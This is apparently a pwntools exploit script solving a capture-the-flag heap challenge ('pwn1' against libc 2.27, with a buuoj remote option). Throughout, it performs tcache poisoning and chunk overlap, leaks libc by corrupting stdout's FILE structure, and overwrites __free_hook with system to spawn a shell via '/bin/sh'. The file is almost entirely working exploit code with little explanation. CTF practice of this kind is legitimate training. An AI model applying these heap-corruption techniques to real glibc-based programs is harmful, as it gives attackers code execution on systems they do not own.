#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.27.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('node4.buuoj.cn', '25468')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('>> ')

def rea(sz, c='\n'):
    # eat()
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Size?', str(sz))
    if sz:
        p.sendafter('Content?', c)

def free():
    eat()
    p.sendline('2')

rea(0x68)
free()
rea(0x18)
rea(0)
rea(0x48)
free()
rea(0)


heap = 0x5010
stdout = 0x0760

rea(0x68, b'a' * 0x18 + p64(0x201) + p16(heap))#size + fd

rea(0)

rea(0x48)
rea(0)# size 为 0x201

rea(0x48, '\xff' * 0x40)

rea(0x58, '1')# change tcache fake chunk
debug()
rea(0x58, b'a' * 0x18 + b'\x00' * 0x20 + p64(0x1f1) + p16(heap + 0x40))# change tcache fake chunk

# rea(0x58, b'a' * 0x18 + b'\x00' * 0x20 + p64(0x1f1) + p16(0x1234))# change tcache fake chunk

rea(0)# 进fastbin

rea(0x18, p64(0) + p64(0))#chunk overlap size 变成 0x1f1

rea(0)
rea(0x1e8,p64(0) * 4 + p16(stdout) + p8(0xdd))
debug()

rea(0)
rea(0x58, p64(0xfbad1800) + p64(0) * 3 + p8(0x58))
#
p.recvuntil('\n')
libc.address = u64(p.recvuntil(b'\x7f').ljust(8,b'\x00')) - libc.symbols["_IO_file_jumps"]
log.success("libc.address: " + hex(libc.address))


p.sendlineafter('>> ', '666')#ptr=0

log.success("__free_hook: " + hex(libc.symbols['__free_hook']))
rea(0x1e8, b'a' * 0x18 + p64(libc.symbols['__free_hook'] - 8))
rea(0)

rea(0x48, b'/bin/sh\x00' + p64(libc.symbols['system']))
free()


p.interactive()
